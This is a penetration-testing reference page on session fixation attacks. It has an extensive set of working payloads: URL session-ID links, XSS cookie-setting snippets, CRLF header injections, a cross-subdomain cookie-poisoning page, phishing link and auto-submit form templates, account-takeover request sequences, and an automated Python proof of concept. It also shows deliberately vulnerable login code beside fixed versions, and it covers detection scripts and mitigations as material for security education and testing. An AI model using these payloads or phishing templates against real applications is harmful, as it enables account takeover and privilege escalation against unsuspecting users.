---
title: Session Fixation Attack
description: Deep dive into Session Fixation vulnerabilities, payloads, exploitation methodology, and privilege escalation techniques.
navigation:
  icon: i-lucide-lock-keyhole
  title: Session Fixation
---

## What is Session Fixation?

Session Fixation is an attack that permits an attacker to **hijack a valid user session** by forcing (fixing) a known session identifier onto the victim. Unlike session hijacking where an attacker steals an existing session, in session fixation the attacker **sets the session ID before** the victim authenticates.

::callout
---
icon: i-lucide-triangle-alert
color: amber
---
The core vulnerability exists when an application **does not regenerate** a new session ID after successful authentication, allowing the pre-set session to remain valid with elevated privileges.
::

::card-group
  ::card
  ---
  title: CWE-384
  icon: i-lucide-shield-alert
  to: https://cwe.mitre.org/data/definitions/384.html
  target: _blank
  ---
  Session Fixation — MITRE CWE Database classification and technical details.
  ::

  ::card
  ---
  title: OWASP Session Fixation
  icon: i-lucide-book-open
  to: https://owasp.org/www-community/attacks/Session_fixation
  target: _blank
  ---
  OWASP official documentation on Session Fixation attack vectors and mitigations.
  ::

  ::card
  ---
  title: OWASP Testing Guide
  icon: i-lucide-flask-conical
  to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation
  target: _blank
  ---
  OWASP WSTG — Testing for Session Fixation (WSTG-SESS-03).
  ::

  ::card
  ---
  title: PortSwigger Research
  icon: i-lucide-search
  to: https://portswigger.net/web-security/authentication/other-mechanisms
  target: _blank
  ---
  PortSwigger Web Security Academy — Authentication mechanism vulnerabilities.
  ::
::

---

## Attack Flow & Methodology

Understanding the attack flow is critical before crafting payloads. The attacker controls the **entire lifecycle** of the session.

::steps{level="3"}

### Step 1 — Attacker Obtains a Valid Session ID

The attacker visits the target application and receives a legitimate session token from the server.

```http [Attacker Request]
GET /login HTTP/1.1
Host: vulnerable-app.com
```

```http [Server Response]
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=attacker_known_session_id_abc123; Path=/; HttpOnly
```

### Step 2 — Attacker Fixes the Session onto the Victim

The attacker delivers the known session ID to the victim through one of the injection vectors (URL, cookie, hidden form).

### Step 3 — Victim Authenticates with the Fixed Session

The victim clicks the crafted link or visits the manipulated page and logs in. The server **does not regenerate** the session ID.

### Step 4 — Attacker Hijacks the Authenticated Session

Since the attacker already knows the session ID, they now have full access to the victim's authenticated session.

::

::tip
The entire attack relies on one critical flaw: **the application accepts externally set session IDs and does not regenerate them upon authentication state change.**
::

---

## Attack Vectors

There are multiple vectors through which an attacker can fix a session ID onto a victim.

::tabs
  :::tabs-item{icon="i-lucide-link" label="URL Parameter"}
  The most common and simplest vector. The session ID is injected directly into the URL.

  ```
  https://vulnerable-app.com/login?PHPSESSID=attacker_controlled_session_id
  ```

  ::note
  This works when the application accepts session identifiers via GET parameters (`session.use_trans_sid` enabled in PHP).
  ::
  :::

  :::tabs-item{icon="i-lucide-cookie" label="Cookie Injection"}
  The attacker sets a cookie on the victim's browser using a related subdomain, XSS, or meta tag injection.

  ```html
  <meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_controlled_id; Path=/">
  ```

  ::note
  Cookie-based fixation is more stealthy because the session ID does not appear in the URL or server logs.
  ::
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Hidden Form Field"}
  Some applications pass session tokens via hidden form fields rather than cookies.

  ```html
  <form action="https://vulnerable-app.com/login" method="POST">
    <input type="hidden" name="PHPSESSID" value="attacker_controlled_id">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Login">
  </form>
  ```
  :::

  :::tabs-item{icon="i-lucide-globe" label="Cross-Subdomain"}
  If the attacker controls `evil.example.com`, they can set cookies for `.example.com` affecting `app.example.com`.

  ```javascript
  document.cookie = "PHPSESSID=fixed_session_id; domain=.example.com; path=/";
  ```
  :::
::

---

## Payloads

::caution
These payloads are for **authorized security testing and educational purposes only**. Unauthorized use is illegal.
::

### URL-Based Session Fixation Payloads

These payloads inject the session ID directly through URL parameters.

::code-group
```text [PHP — PHPSESSID]
https://vulnerable-app.com/login.php?PHPSESSID=fixedsession123abc
```

```text [JSP — JSESSIONID]
https://vulnerable-app.com/login;jsessionid=fixedsession123abc
```

```text [ASP.NET — ASP.NET_SessionId]
https://vulnerable-app.com/login.aspx?ASP.NET_SessionId=fixedsession123abc
```

```text [Generic — sid Parameter]
https://vulnerable-app.com/auth?sid=fixedsession123abc&redirect=/dashboard
```

```text [Double Encoded]
https://vulnerable-app.com/login?PHPSESSID%3Dfixedsession123abc
```

```text [With Redirect Chain]
https://vulnerable-app.com/redirect?url=/login?PHPSESSID=fixedsession123abc&next=/account
```
::

### Cookie Injection Payloads

::code-group
```html [Meta Tag Injection]
<meta http-equiv="Set-Cookie" content="PHPSESSID=fixedsession123abc; Path=/">
```

```html [Via XSS — document.cookie]
<script>document.cookie="PHPSESSID=fixedsession123abc; path=/; domain=.vulnerable-app.com";</script>
```

```html [Via XSS — Encoded]
<script>document.cookie=String.fromCharCode(80,72,80,83,69,83,83,73,68)+"=fixedsession123abc";</script>
```

```html [Via Image Tag Error Handler]
<img src=x onerror="document.cookie='PHPSESSID=fixedsession123abc; path=/'">
```

```html [Via SVG onload]
<svg onload="document.cookie='PHPSESSID=fixedsession123abc; path=/'">
```

```html [Via iframe srcdoc]
<iframe srcdoc="<script>parent.document.cookie='PHPSESSID=fixedsession123abc;path=/'</script>"></iframe>
```
::

### HTTP Header Injection Payloads

When the application reflects user input into HTTP response headers.

::code-group
```text [CRLF Injection — Set-Cookie]
https://vulnerable-app.com/page?lang=en%0d%0aSet-Cookie:%20PHPSESSID=fixedsession123abc
```

```text [CRLF — Double Header]
https://vulnerable-app.com/redirect?url=%0d%0aSet-Cookie:%20PHPSESSID=fixedsession123abc%0d%0a
```

```text [Header Injection via Host]
GET /login HTTP/1.1
Host: vulnerable-app.com
Cookie: PHPSESSID=fixedsession123abc
```
::

### Cross-Subdomain Payloads

::code-group
```javascript [Subdomain Cookie Poisoning]
// Hosted on attacker-controlled evil.example.com
document.cookie = "PHPSESSID=fixedsession123abc; domain=.example.com; path=/";
window.location = "https://app.example.com/login";
```

```html [Full HTML Payload Page]
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
  document.cookie = "PHPSESSID=fixedsession123abc; domain=.example.com; path=/; expires=Thu, 01 Jan 2099 00:00:00 GMT";
  setTimeout(function(){
    window.location = "https://app.example.com/dashboard";
  }, 1000);
</script>
<p>Please wait, redirecting...</p>
</body>
</html>
```
::

### Social Engineering Delivery Payloads

::code-group
```html [Phishing Email Link]
<a href="https://vulnerable-app.com/login?PHPSESSID=fixedsession123abc">
  Click here to verify your account
</a>
```

```html [Hidden Form Auto-Submit]
<!DOCTYPE html>
<html>
<body onload="document.getElementById('fixForm').submit();">
  <form id="fixForm" action="https://vulnerable-app.com/login" method="GET">
    <input type="hidden" name="PHPSESSID" value="fixedsession123abc">
  </form>
</body>
</html>
```

```html [Shortened URL with Fixed Session]
<!-- Attacker creates short URL pointing to: -->
<!-- https://vulnerable-app.com/login?PHPSESSID=fixedsession123abc -->
<a href="https://bit.ly/3xFakeLink">Exclusive offer - Login now!</a>
```
::

---

### Advanced Payloads

::code-collapse

```python [automated_fixation.py]
#!/usr/bin/env python3
"""
Session Fixation Automated PoC
For authorized penetration testing only
"""

import requests
import sys
from urllib.parse import urljoin

class SessionFixationPoC:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.fixed_session_id = None

    def step1_obtain_session(self):
        """Get a valid session ID from the target"""
        print("[*] Step 1: Obtaining valid session ID...")
        resp = self.session.get(urljoin(self.target, "/login"))
        
        cookies = self.session.cookies.get_dict()
        print(f"[+] Cookies received: {cookies}")
        
        # Try common session cookie names
        session_names = [
            'PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId',
            'session_id', 'sid', 'SESSID', 'connect.sid'
        ]
        
        for name in session_names:
            if name in cookies:
                self.fixed_session_id = cookies[name]
                self.session_cookie_name = name
                print(f"[+] Found session: {name}={self.fixed_session_id}")
                return True
        
        print("[-] No known session cookie found")
        print(f"    Available cookies: {list(cookies.keys())}")
        return False

    def step2_generate_payloads(self):
        """Generate fixation payloads for delivery"""
        print("\n[*] Step 2: Generating fixation payloads...")
        
        payloads = {
            "URL Parameter": f"{self.target}/login?{self.session_cookie_name}={self.fixed_session_id}",
            
            "Meta Tag": f'<meta http-equiv="Set-Cookie" content="{self.session_cookie_name}={self.fixed_session_id}; Path=/">',
            
            "JavaScript": f'<script>document.cookie="{self.session_cookie_name}={self.fixed_session_id}; path=/";</script>',
            
            "CRLF Injection": f"{self.target}/page?param=value%0d%0aSet-Cookie:%20{self.session_cookie_name}={self.fixed_session_id}",
        }
        
        print("\n" + "="*60)
        for name, payload in payloads.items():
            print(f"\n[+] {name}:")
            print(f"    {payload}")
        print("\n" + "="*60)
        
        return payloads

    def step3_verify_fixation(self):
        """Check if session persists after auth (test only)"""
        print("\n[*] Step 3: Verifying if session ID persists...")
        
        verify_session = requests.Session()
        verify_session.cookies.set(
            self.session_cookie_name, 
            self.fixed_session_id
        )
        
        resp = verify_session.get(
            urljoin(self.target, "/dashboard"),
            allow_redirects=False
        )
        
        new_cookies = verify_session.cookies.get_dict()
        
        if self.session_cookie_name in new_cookies:
            if new_cookies[self.session_cookie_name] == self.fixed_session_id:
                print("[!!!] VULNERABLE — Session ID was NOT regenerated!")
                print(f"      Fixed ID: {self.fixed_session_id}")
                print(f"      Current:  {new_cookies[self.session_cookie_name]}")
                return True
            else:
                print("[OK] NOT VULNERABLE — Session ID was regenerated")
                print(f"      Fixed ID: {self.fixed_session_id}")
                print(f"      New ID:   {new_cookies[self.session_cookie_name]}")
                return False
        
        print("[?] Could not determine — manual verification needed")
        return None

    def run(self):
        print(f"{'='*60}")
        print(f" Session Fixation PoC — Target: {self.target}")
        print(f"{'='*60}\n")
        
        if not self.step1_obtain_session():
            sys.exit(1)
        
        self.step2_generate_payloads()
        self.step3_verify_fixation()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} https://vulnerable-app.com")
        sys.exit(1)
    
    poc = SessionFixationPoC(sys.argv[1])
    poc.run()
```

::

::code-collapse

```python [burp_session_fixation_check.py]
#!/usr/bin/env python3
"""
Burp Suite Extension - Session Fixation Scanner
Checks if session IDs are regenerated after authentication
"""

import requests
import json
from datetime import datetime

class SessionFixationScanner:
    
    COMMON_SESSION_NAMES = [
        'PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId',
        'ASPSESSIONID', 'session_id', 'sid', 'SESSID',
        'connect.sid', 'ci_session', 'CFID', 'CFTOKEN',
        'laravel_session', '_session_id', 'rack.session',
        'beaker.session.id', 'SERVERID'
    ]
    
    COMMON_LOGIN_PATHS = [
        '/login', '/signin', '/auth', '/authenticate',
        '/api/login', '/api/auth', '/user/login',
        '/account/login', '/session/new', '/wp-login.php',
        '/administrator', '/admin/login'
    ]

    def __init__(self, target):
        self.target = target.rstrip('/')
        self.results = []

    def scan_session_names(self):
        """Identify which session cookies the target uses"""
        found = {}
        try:
            resp = requests.get(self.target, timeout=10)
            for cookie in resp.cookies:
                if cookie.name in self.COMMON_SESSION_NAMES:
                    found[cookie.name] = {
                        'value': cookie.value,
                        'secure': cookie.secure,
                        'httponly': cookie.has_nonstandard_attr('HttpOnly'),
                        'samesite': cookie.get_nonstandard_attr('SameSite', 'Not Set'),
                        'domain': cookie.domain,
                        'path': cookie.path
                    }
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] {e}")
        
        return found

    def check_url_acceptance(self, session_name):
        """Test if app accepts session ID via URL parameter"""
        test_id = "fixation_test_" + datetime.now().strftime("%s")
        test_url = f"{self.target}/?{session_name}={test_id}"
        
        try:
            resp = requests.get(test_url, timeout=10)
            for cookie in resp.cookies:
                if cookie.name == session_name and cookie.value == test_id:
                    return True
        except:
            pass
        
        return False

    def generate_report(self, findings):
        """Generate JSON report of findings"""
        report = {
            'target': self.target,
            'scan_date': datetime.now().isoformat(),
            'findings': findings,
            'severity': 'HIGH' if any(f.get('vulnerable') for f in findings) else 'INFO'
        }
        
        return json.dumps(report, indent=2)


if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    
    scanner = SessionFixationScanner(sys.argv[1])
    sessions = scanner.scan_session_names()
    
    print(f"\n[*] Found {len(sessions)} session cookie(s)")
    for name, details in sessions.items():
        print(f"\n  Cookie: {name}")
        for k, v in details.items():
            print(f"    {k}: {v}")
        
        accepts_url = scanner.check_url_acceptance(name)
        print(f"    URL Acceptance: {'YES — VULNERABLE' if accepts_url else 'No'}")
```

::

---

## Privilege Escalation via Session Fixation

::warning
Session Fixation is not just a session hijack — it can be a **full privilege escalation vector** when combined with role-based access or multi-step authentication workflows.
::

### How PrivEsc Works

The privilege escalation occurs because the **session object on the server side gets upgraded** with authentication data and role assignments while the **session identifier remains the same**.

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Vertical PrivEsc"}
  
  **Vertical Privilege Escalation** — gaining higher-level access (user → admin).

  ::steps{level="4"}

  #### Attacker obtains a session as anonymous user

  The session has no privileges — it's a blank session object on the server.

  ```json [Server Session Store]
  {
    "session_id": "fixedsession123abc",
    "authenticated": false,
    "role": null,
    "user": null
  }
  ```

  #### Attacker sends fixed session link to an admin

  ```text
  https://vulnerable-app.com/admin/login?PHPSESSID=fixedsession123abc
  ```

  #### Admin authenticates — session gets upgraded

  The server updates the **same session object** without changing the ID.

  ```json [Server Session Store — After Admin Login]
  {
    "session_id": "fixedsession123abc",
    "authenticated": true,
    "role": "administrator",
    "user": "admin@company.com",
    "permissions": ["read", "write", "delete", "manage_users"]
  }
  ```

  #### Attacker now has admin access

  The attacker uses the same `fixedsession123abc` and inherits all admin privileges.

  ```http [Attacker's Request with Fixed Session]
  GET /admin/dashboard HTTP/1.1
  Host: vulnerable-app.com
  Cookie: PHPSESSID=fixedsession123abc
  ```

  ::
  :::

  :::tabs-item{icon="i-lucide-users" label="Horizontal PrivEsc"}
  
  **Horizontal Privilege Escalation** — accessing another user's account at the same privilege level.

  ::steps{level="4"}

  #### Target a specific user

  The attacker crafts a fixation payload targeting a specific user they want to impersonate.

  #### Deliver via targeted phishing

  ```html
  Subject: Action Required — Verify Your Account

  <a href="https://app.example.com/login?sid=attacker_session_xyz">
    Click here to verify your identity
  </a>
  ```

  #### Victim logs in with their credentials

  The victim's identity, personal data, payment methods, and account details are now associated with `attacker_session_xyz`.

  #### Attacker accesses victim's data

  ```http
  GET /api/user/profile HTTP/1.1
  Host: app.example.com
  Cookie: sid=attacker_session_xyz
  ```

  Response contains the victim's personal data.

  ::
  :::

  :::tabs-item{icon="i-lucide-layers" label="Multi-Step PrivEsc"}
  
  **Multi-Step Escalation** — chaining session fixation with other vulnerabilities.

  | Step | Action | Result |
  |------|--------|--------|
  | 1 | Session Fixation on low-priv user | Authenticated session obtained |
  | 2 | IDOR on role change endpoint | `POST /api/user/role` with `role=admin` |
  | 3 | Access admin panel | Full admin control |
  | 4 | Upload web shell via admin file manager | Remote Code Execution |
  | 5 | Reverse shell from web shell | System-level access |
  | 6 | Kernel exploit or sudo misconfig | Root/SYSTEM |

  ::caution
  This chain demonstrates why session fixation is classified as **High severity** — it's often the initial foothold for deeper compromise.
  ::
  :::
::

### PrivEsc Attack Payloads

::code-group
```http [Vertical — Admin Session Takeover]
# 1. Get session
GET /login HTTP/1.1
Host: target.com

# Response: Set-Cookie: sid=abc123

# 2. Fix session on admin (send this link to admin)
# https://target.com/admin?sid=abc123

# 3. After admin logs in, access admin panel
GET /admin/users HTTP/1.1
Host: target.com
Cookie: sid=abc123
```

```http [Horizontal — Account Takeover]
# 1. Fix session on target user
# https://target.com/login?PHPSESSID=xyz789

# 2. After user logs in, access their profile
GET /account/settings HTTP/1.1
Host: target.com
Cookie: PHPSESSID=xyz789

# 3. Change email for full account takeover
POST /account/change-email HTTP/1.1
Host: target.com
Cookie: PHPSESSID=xyz789
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```

```http [Token Escalation — API]
# 1. Fix session via API
POST /api/auth/init HTTP/1.1
Host: api.target.com
Content-Type: application/json

{"session_token": "controlled_token_123"}

# 2. Victim authenticates via same flow
# 3. Use fixed token to access API as victim
GET /api/v2/admin/config HTTP/1.1
Host: api.target.com
Authorization: Bearer controlled_token_123
```
::

---

## Technology-Specific Payloads

::accordion
  :::accordion-item{icon="i-simple-icons-php" label="PHP Applications"}
  
  PHP is the most commonly vulnerable due to `session.use_trans_sid` behavior.

  ::code-group
  ```text [URL Fixation]
  https://target.com/login.php?PHPSESSID=controlled_session_value
  ```

  ```php [Vulnerable PHP Code]
  <?php
  // VULNERABLE — No session regeneration
  session_start();
  
  if ($_POST['username'] === 'admin' && $_POST['password'] === 'pass') {
      // Session ID stays the same!
      $_SESSION['authenticated'] = true;
      $_SESSION['role'] = 'admin';
      header('Location: /dashboard.php');
  }
  ?>
  ```

  ```php [Fixed PHP Code]
  <?php
  session_start();
  
  if ($_POST['username'] === 'admin' && $_POST['password'] === 'pass') {
      // Regenerate session ID — prevents fixation
      session_regenerate_id(true);
      $_SESSION['authenticated'] = true;
      $_SESSION['role'] = 'admin';
      header('Location: /dashboard.php');
  }
  ?>
  ```
  ::
  :::

  :::accordion-item{icon="i-simple-icons-spring" label="Java / JSP Applications"}
  
  Java uses `JSESSIONID` which can be embedded in the URL path.

  ::code-group
  ```text [URL Path Fixation — Semicolon Syntax]
  https://target.com/login;jsessionid=controlled_session_value
  ```

  ```text [URL Parameter Fixation]
  https://target.com/login?jsessionid=controlled_session_value
  ```

  ```java [Vulnerable Servlet Code]
  // VULNERABLE — Session not invalidated
  protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
      String user = req.getParameter("username");
      String pass = req.getParameter("password");
      
      if (authenticate(user, pass)) {
          HttpSession session = req.getSession();
          session.setAttribute("user", user);
          session.setAttribute("role", "admin");
          resp.sendRedirect("/dashboard");
      }
  }
  ```

  ```java [Fixed Servlet Code]
  protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
      String user = req.getParameter("username");
      String pass = req.getParameter("password");
      
      if (authenticate(user, pass)) {
          // Invalidate old session and create new one
          req.getSession().invalidate();
          HttpSession newSession = req.getSession(true);
          newSession.setAttribute("user", user);
          newSession.setAttribute("role", "admin");
          resp.sendRedirect("/dashboard");
      }
  }
  ```
  ::
  :::

  :::accordion-item{icon="i-simple-icons-dotnet" label="ASP.NET Applications"}
  
  ::code-group
  ```text [Cookie Fixation]
  ASP.NET_SessionId=controlled_value
  ```

  ```text [URL Fixation — Cookieless Mode]
  https://target.com/(S(controlled_session_value))/login.aspx
  ```

  ```csharp [Vulnerable C# Code]
  // VULNERABLE — No session reset after auth
  protected void LoginButton_Click(object sender, EventArgs e)
  {
      if (ValidateUser(txtUser.Text, txtPass.Text))
      {
          Session["IsAuthenticated"] = true;
          Session["UserRole"] = "Admin";
          Response.Redirect("~/Admin/Dashboard.aspx");
      }
  }
  ```

  ```csharp [Fixed C# Code]
  protected void LoginButton_Click(object sender, EventArgs e)
  {
      if (ValidateUser(txtUser.Text, txtPass.Text))
      {
          // Abandon old session and issue new one
          Session.Abandon();
          Response.Cookies.Add(new HttpCookie("ASP.NET_SessionId", ""));
          
          Session["IsAuthenticated"] = true;
          Session["UserRole"] = "Admin";
          Response.Redirect("~/Admin/Dashboard.aspx");
      }
  }
  ```
  ::
  :::

  :::accordion-item{icon="i-simple-icons-nodedotjs" label="Node.js / Express Applications"}
  
  ::code-group
  ```text [Cookie Fixation]
  connect.sid=s%3Acontrolled_session_value
  ```

  ```javascript [Vulnerable Express Code]
  // VULNERABLE — Session not regenerated
  app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    if (authenticate(username, password)) {
      req.session.authenticated = true;
      req.session.user = username;
      req.session.role = 'admin';
      res.redirect('/dashboard');
    }
  });
  ```

  ```javascript [Fixed Express Code]
  app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    if (authenticate(username, password)) {
      // Regenerate session — prevents fixation
      req.session.regenerate((err) => {
        if (err) return res.status(500).send('Session error');
        req.session.authenticated = true;
        req.session.user = username;
        req.session.role = 'admin';
        res.redirect('/dashboard');
      });
    }
  });
  ```
  ::
  :::
::

---

## Detection & Testing

### Manual Testing Methodology

::steps{level="4"}

#### Obtain a valid pre-authentication session

Open the login page and note the session cookie value using browser DevTools or Burp Suite.

```bash [Using curl]
curl -v https://target.com/login 2>&1 | grep -i "set-cookie"
```

#### Authenticate and compare session IDs

Log in with valid credentials and compare the session ID **before** and **after** authentication.

```bash [Compare Sessions]
# Before auth
echo "Pre-auth session: PHPSESSID=abc123xyz"

# After auth  
echo "Post-auth session: PHPSESSID=???"

# If PHPSESSID is still abc123xyz → VULNERABLE
# If PHPSESSID changed to new_value → NOT VULNERABLE
```

#### Test URL parameter acceptance

Try setting the session via URL parameter to see if the server accepts it.

```bash [Test URL Acceptance]
curl -v "https://target.com/login?PHPSESSID=my_custom_session_id" \
  2>&1 | grep -i "set-cookie"
```

#### Verify cross-session access

Use the fixed session ID from a different browser or tool to confirm access.

```bash [Verify Access]
curl -b "PHPSESSID=fixed_session_id" \
  https://target.com/dashboard
```

::

### Automated Detection

::code-collapse

```bash [session_fixation_test.sh]
#!/bin/bash
#================================================
# Session Fixation Detection Script
# For authorized penetration testing only
#================================================

TARGET="${1:?Usage: $0 <target_url>}"
COOKIE_JAR="/tmp/sf_test_$$.txt"
RESULT_FILE="/tmp/sf_result_$$.txt"

echo "=========================================="
echo " Session Fixation Tester"
echo " Target: $TARGET"
echo "=========================================="

# Step 1: Get pre-auth session
echo -e "\n[*] Step 1: Getting pre-authentication session..."
PRE_AUTH=$(curl -s -c "$COOKIE_JAR" -D - "$TARGET/login" 2>/dev/null \
  | grep -i "set-cookie" | head -1)

echo "    Response: $PRE_AUTH"

# Extract session cookie name and value
SESSION_NAME=$(echo "$PRE_AUTH" | grep -oP '[\w.]+(?==)' | head -1)
SESSION_VALUE=$(echo "$PRE_AUTH" | grep -oP '(?<==)[^;]+' | head -1)

if [ -z "$SESSION_NAME" ] || [ -z "$SESSION_VALUE" ]; then
    echo "[-] Could not extract session cookie"
    exit 1
fi

echo "    Cookie Name:  $SESSION_NAME"
echo "    Cookie Value: $SESSION_VALUE"

# Step 2: Test URL parameter acceptance
echo -e "\n[*] Step 2: Testing URL parameter acceptance..."
TEST_SID="fixation_test_$(date +%s)"
URL_TEST=$(curl -s -D - "$TARGET/login?$SESSION_NAME=$TEST_SID" 2>/dev/null \
  | grep -i "set-cookie")

if echo "$URL_TEST" | grep -q "$TEST_SID"; then
    echo "    [!] URL parameter accepted — POTENTIAL VULNERABILITY"
else
    echo "    [OK] URL parameter not accepted directly"
fi

# Step 3: Check session regeneration
echo -e "\n[*] Step 3: Checking session regeneration..."
echo "    (Would require valid credentials for full test)"
echo "    Pre-auth session to monitor: $SESSION_NAME=$SESSION_VALUE"

# Step 4: Generate payloads
echo -e "\n[*] Step 4: Generated Payloads:"
echo "    URL:  $TARGET/login?$SESSION_NAME=$SESSION_VALUE"
echo "    Meta: <meta http-equiv=\"Set-Cookie\" content=\"$SESSION_NAME=$SESSION_VALUE\">"
echo "    JS:   <script>document.cookie='$SESSION_NAME=$SESSION_VALUE;path=/'</script>"

# Cleanup
rm -f "$COOKIE_JAR" "$RESULT_FILE"

echo -e "\n[*] Done. Manual verification recommended."
```

::

---

## Exploitation Diagram

::note
The following illustrates the complete session fixation attack flow from initial session acquisition through privilege escalation.
::

```text [Attack Flow Diagram]
┌─────────────┐          ┌──────────────────┐          ┌─────────────┐
│   ATTACKER  │          │   VULNERABLE APP │          │   VICTIM    │
└──────┬──────┘          └────────┬─────────┘          └──────┬──────┘
       │                          │                           │
       │  1. GET /login           │                           │
       │ ─────────────────────►   │                           │
       │                          │                           │
       │  Set-Cookie: SID=abc123  │                           │
       │ ◄─────────────────────   │                           │
       │                          │                           │
       │  2. Craft malicious URL  │                           │
       │  ┌─────────────────────┐ │                           │
       │  │ target.com/login    │ │                           │
       │  │ ?SID=abc123         │ │                           │
       │  └─────────────────────┘ │                           │
       │                          │                           │
       │  3. Send link to victim ─────────────────────────►   │
       │     (phishing/social eng)│                           │
       │                          │                           │
       │                          │   4. Victim clicks link   │
       │                          │   GET /login?SID=abc123   │
       │                          │ ◄─────────────────────    │
       │                          │                           │
       │                          │   5. Victim logs in       │
       │                          │   POST /auth              │
       │                          │   Cookie: SID=abc123      │
       │                          │ ◄─────────────────────    │
       │                          │                           │
       │                          │   ╔═══════════════════╗   │
       │                          │   ║ SID=abc123 is now ║   │
       │                          │   ║ AUTHENTICATED     ║   │
       │                          │   ║ role: admin       ║   │
       │                          │   ╚═══════════════════╝   │
       │                          │                           │
       │  6. Use known SID        │                           │
       │  GET /admin/dashboard    │                           │
       │  Cookie: SID=abc123      │                           │
       │ ─────────────────────►   │                           │
       │                          │                           │
       │  7. Full admin access!   │                           │
       │ ◄─────────────────────   │                           │
       │                          │                           │
       │  ╔═══════════════════╗   │                           │
       │  ║ PRIVESC ACHIEVED  ║   │                           │
       │  ║ anonymous → admin ║   │                           │
       │  ╚═══════════════════╝   │                           │
```

---

## Mitigation & Prevention

::card-group
  ::card
  ---
  title: Regenerate Session ID
  icon: i-lucide-refresh-cw
  ---
  **Always** call `session_regenerate_id(true)` (PHP), `request.getSession().invalidate()` (Java), or `req.session.regenerate()` (Node.js) after authentication state changes.
  ::

  ::card
  ---
  title: Reject External Session IDs
  icon: i-lucide-shield-off
  ---
  Configure the server to **only accept session IDs it has generated**. In PHP set `session.use_strict_mode = 1`.
  ::

  ::card
  ---
  title: Bind Session to Client
  icon: i-lucide-fingerprint
  ---
  Bind sessions to client fingerprints (IP address, User-Agent hash) so a fixated session from a different client is rejected.
  ::

  ::card
  ---
  title: Secure Cookie Attributes
  icon: i-lucide-cookie
  ---
  Set `HttpOnly`, `Secure`, `SameSite=Strict`, and proper `Domain`/`Path` on all session cookies to prevent client-side manipulation.
  ::

  ::card
  ---
  title: Disable URL-Based Sessions
  icon: i-lucide-link-2-off
  ---
  Disable `session.use_trans_sid` (PHP), disable URL rewriting in Java containers, and never pass session tokens in URL parameters.
  ::

  ::card
  ---
  title: Set Session Expiration
  icon: i-lucide-timer
  ---
  Implement aggressive session timeouts and absolute session lifetimes to limit the window of opportunity for fixation attacks.
  ::
::

---

## References & Resources

::card-group
  ::card
  ---
  title: OWASP Session Fixation
  icon: i-lucide-book-open
  to: https://owasp.org/www-community/attacks/Session_fixation
  target: _blank
  ---
  Complete OWASP documentation on Session Fixation attack patterns, examples, and countermeasures.
  ::

  ::card
  ---
  title: CWE-384 — Session Fixation
  icon: i-lucide-database
  to: https://cwe.mitre.org/data/definitions/384.html
  target: _blank
  ---
  MITRE Common Weakness Enumeration entry with technical description, relationships, and observed examples.
  ::

  ::card
  ---
  title: OWASP WSTG-SESS-03
  icon: i-lucide-clipboard-check
  to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation
  target: _blank
  ---
  Web Security Testing Guide — Step-by-step testing methodology for Session Fixation.
  ::

  ::card
  ---
  title: OWASP Session Management Cheat Sheet
  icon: i-lucide-scroll-text
  to: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
  target: _blank
  ---
  Comprehensive session management best practices and security guidelines.
  ::

  ::card
  ---
  title: HackTricks — Session Fixation
  icon: i-lucide-terminal
  to: https://book.hacktricks.wiki/en/pentesting-web/session-fixation.html
  target: _blank
  ---
  Practical penetration testing guide with real-world exploitation techniques.
  ::

  ::card
  ---
  title: PortSwigger Web Security Academy
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/authentication
  target: _blank
  ---
  Interactive labs and detailed explanations of authentication vulnerabilities including session attacks.
  ::
::

::tip{to="https://owasp.org/www-project-web-security-testing-guide/"}
For a comprehensive web security testing methodology, refer to the **OWASP Web Security Testing Guide (WSTG)** which covers session management testing in depth.
::